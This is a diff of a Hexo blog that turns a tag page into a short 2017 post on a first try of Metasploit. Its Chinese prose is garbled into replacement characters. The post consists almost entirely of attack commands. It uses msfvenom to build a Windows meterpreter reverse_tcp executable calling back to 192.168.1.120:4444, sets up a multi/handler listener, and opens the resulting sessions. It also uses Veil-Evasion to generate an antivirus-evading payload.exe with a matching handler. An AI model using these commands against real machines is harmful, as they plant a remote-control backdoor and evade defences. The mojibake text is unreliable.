@@ -1,30 +1,48 @@
 <!DOCTYPE html>
 
 
-  <html class="light page-tag">
+  <html class="light page-post">
 
 
 <head>
   <meta charset="utf-8">
   
-  <title>tag | sun1024</title>
+  <title>msf������ | sun1024</title>
 
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 
   
-    <meta name="keywords" content="sun1024,adminsun,python,php,Hexo主题,前端开发,nodejs,JavaScript,CTF,SRC" />
+    <meta name="keywords" content="metasploit," />
   
 
-  <meta name="description" content="这是我的家哦~">
-<meta property="og:type" content="website">
-<meta property="og:title" content="tag">
-<meta property="og:url" content="http://yoursite.com/tag/index.html">
+  <meta name="description" content="#msf����ʹ�ã�(��windows/meterpreter/reverse_tcpΪ��)
+##1.payload���ã�
+
+�¿��ն�
+
+msfvenom -l
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.120 LPORT=4444 -f exe -o /root/����/1.exe //����exe">
+<meta property="og:type" content="article">
+<meta property="og:title" content="msf������">
+<meta property="og:url" content="http://yoursite.com/2017/02/06/msf初体验/index.html">
 <meta property="og:site_name" content="sun1024">
-<meta property="og:description" content="这是我的家哦~">
-<meta property="og:updated_time" content="2017-01-14T12:47:19.293Z">
+<meta property="og:description" content="#msf����ʹ�ã�(��windows/meterpreter/reverse_tcpΪ��)
+##1.payload���ã�
+
+�¿��ն�
+
+msfvenom -l
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.120 LPORT=4444 -f exe -o /root/����/1.exe //����exe">
+<meta property="og:updated_time" content="2017-02-06T13:43:44.217Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="tag">
-<meta name="twitter:description" content="这是我的家哦~">
+<meta name="twitter:title" content="msf������">
+<meta name="twitter:description" content="#msf����ʹ�ã�(��windows/meterpreter/reverse_tcpΪ��)
+##1.payload���ã�
+
+�¿��ն�
+
+msfvenom -l
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.120 LPORT=4444 -f exe -o /root/����/1.exe //����exe">
 
   
 
@@ -70,17 +88,8 @@
     <span id="toolbox-mobile" class="toolbox-mobile">点我</span>
   
 
-  <div class="content content-tag">
-  <div class="page-header">
-
-  
-    <div class="breadcrumb">
-      <div class="location">标签</div>
-      <i class="icon-location"></i>
-    </div>
-  
-
-  
+  <div class="post-header CENTER">
+   
   <div class="toolbox">
     <a class="toolbox-entry" href="/">
       <span class="toolbox-entry-text">点我</span>
@@ -170,62 +179,137 @@
   </div>
 
 
+</div>
 
-  <div class="box-blog-info">
-    <a class="avatar" href="/">
-      <img src="https://avatars0.githubusercontent.com/u/18361006?v=3&amp;u=36007d3bb848c6d543dc5eadebc62fd1e14ce28b&amp;s=400" alt="" />
-    </a>
-    <div class="info">
-      <h3 class="name" style="font-family: calligraffittiregular">
-        sun1024
-      </h3>
-      <div class="slogan">
-        We are all in the gutter, but some of us are looking at the stars. 
+
+
+
+<div class="content content-post CENTER">
+   <article id="post-msf初体验" class="article article-type-post" itemprop="blogPost">
+  <header class="article-header">
+    <h1 class="post-title">msf������</h1>
+
+    <div class="article-meta">
+      <span>
+        <i class="icon-calendar"></i>
+        <span>2017.02.06</span>
+      </span>
+
+      
+        <span class="article-author">
+          <i class="icon-user"></i>
+          <span>sun1024</span>
+        </span>
+      
+
+      
+
+
+      
+
+      
+      <i class="fa fa-eye"></i> 
+        <span id="busuanzi_container_page_pv">
+           &nbsp热度 <span id="busuanzi_value_page_pv">
+           <i class="fa fa-spinner fa-spin"></i></span>℃
+        </span>
+      
+
+      
+      
+    </div>
+  </header>
+
+  <div class="article-content">
+    
+      <p>#msf����ʹ�ã�(��windows/meterpreter/reverse_tcpΪ��)</p>
+<p>##1.payload���ã�</p>
+<ul>
+<li>�¿��ն�</li>
+</ul>
+<p><code>msfvenom -l</code></p>
+<p><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.120 LPORT=4444 -f exe -o /root/����/1.exe //����exe�ļ�</code></p>
+<p>##2.������</p>
+<ul>
+<li>����metasploit</li>
+</ul>
+<p><code>use exploit/multi/handler</code></p>
+<p><code>show options</code></p>
+<p>##3.���빥������</p>
+<ul>
+<li>show payloads</li>
+</ul>
+<p><code>set payload windows/meterpreter_reverse_tcp</code></p>
+<ul>
+<li>�ٴ�show options(����LHOST��LPORTѡ��)</li>
+</ul>
+<p><code>set lhost 192.168.1.120</code></p>
+<p><code>set lport 4444</code></p>
+<p>##4.ʹ��run ���� exploit ��������</p>
+<ul>
+<li><p>�ȴ��������������У������õ�session</p>
+</li>
+<li><p>ʹ��jobsֹͣ����</p>
+</li>
+</ul>
+<p><code>sessions -l  //��ȡsession�б�</code></p>
+<p><code>sessions -i 1 //����meterpreter</code></p>
+<p>==============================</p>
+<p>#PS:</p>
+<p>ʹ��veil-veasion���ɺ��ţ�<br>�����ն�</p>
+<p><code>veil-veasion</code></p>
+<p><code>list</code></p>
+<p><code>use 6 //��cΪ��</code></p>
+<p>���ɵĺ�̨��ַ��<br><code>/var/lib/veil-evasion/output/compiled/payload.exe</code></p>
+<p>��msf��ʹ�ã�</p>
+<p><code>msfconsole -r /var/lib/veil-evasion/output/handlers/payload_handler.rc</code></p>
+
+    
+  </div>
+</article>
+
+
+   
+  <div class="text-center donation">
+    <div class="inner-donation">
+      <span class="btn-donation">支持一下</span>
+      <div class="donation-body">
+        <div class="tip text-center">扫一扫，支持sun1024</div>
+        <ul class="theme.donation.items.length">
+        
+          <li class="item">
+            <img src="/images/qr-wechat.png" alt="">
+          </li>
+        
+          <li class="item">
+            <img src="/images/qr-alipay.png" alt="">
+          </li>
+        
+        </ul>
       </div>
     </div>
   </div>
 
-</div>
 
-  <section class="tag-box">
-  <div class="tag-title">标签</div>
-  <div class="tag-list">
-    
-      <a class="tag-item" href="#metasploit">
-        <span class="tag-name">metasploit</span>
-        <span class="tag-size">( 1 )</span>
-      </a>
-    
+   
+  <div class="box-prev-next clearfix">
+    <a class="show pull-left" href="/2017/01/14/hello world/">
+        <i class="icon icon-angle-left"></i>
+    </a>
+    <a class="hide pull-right" href="/">
+        <i class="icon icon-angle-right"></i>
+    </a>
   </div>
-</section>
-
-  <ul class="list-post"><li id="metasploit" class="item-category-name item-title item-title-0">
-  <!--
-    <a href="" class="text-year">
-   -->
-    metasploit
-    <span class="category-count">( 1 )</span>
-  <!--
-  </a>
-   -->
-</li>
-<li class="item-post item">
-  <span class="post-date">02-06</span>
-
-  
-  <a class="post-title" href="/2017/02/06/msf初体验/">msf������</a>
 
 
-</li>
-</ul>
+
+
 </div>
 
 
   <a id="backTop" class="back-top">
     <i class="icon-angle-up"></i>
   </a>
-
-
 
 
 
@@ -324,6 +408,17 @@
 </div>
 
 
+
+  
+      <div class="fexo-comments comments-post">
+    
+
+    
+
+
+
+
+  </div>
 
   
 
